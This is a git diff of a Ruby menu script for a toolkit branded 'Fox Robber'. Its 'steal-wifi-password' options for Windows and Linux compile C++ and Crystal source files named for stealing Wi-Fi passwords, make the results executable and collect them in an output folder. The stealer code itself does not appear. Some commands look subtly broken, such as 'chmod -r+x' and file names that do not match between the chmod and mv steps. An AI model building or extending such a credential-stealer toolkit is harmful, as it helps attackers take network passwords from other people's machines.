@@ -50,9 +50,9 @@ while true
               case command_windows
               when '9', 'steal-wifi-password'
                 system('g++ Windows/Windows_Steal\ WIFI\ password.cpp')
-                system('mv a.out Windows_Steal_WIFI_password.out')
-                system('chmod +x Windows_Steal_WIFI_password.out')
-                system('mv Windows_Steal_WIFI_password.out Out/')
+                system('mv a.out Windows_Steal_WIFI_password')
+                system('chmod -r+x Windows_Steal_WIFI_password')
+                system('mv Windows_Steal_WIFI_password Out/')
                 puts 'Loading...'
                 puts 'File made by Fox Robber 🦊'
                 system("echo \"\t<Press enter>\" | lolcat -a")
@@ -78,7 +78,9 @@ while true
             command_linux = gets.chomp
             case command_linux
             when '9', 'steal-wifi-password'
-              ### run crystal code ###
+              system('crystal build Linux/Linux_Steal\ WIFI\ password.cr')
+              system('chmod -r+x Linux_Steal_WIFI_password')
+              system('mv Linux_Steal\ WIFI\ password Out/')
               puts 'File made by Fox Robber 🦊'
               system("echo \"\t<Press enter>\" | lolcat -a")
               gets.chomp
@@ -88,6 +90,7 @@ while true
             end
           end
         end
+        break
       elsif %w[0 back].include?(command_fox_robber)
         system('clear')
         break
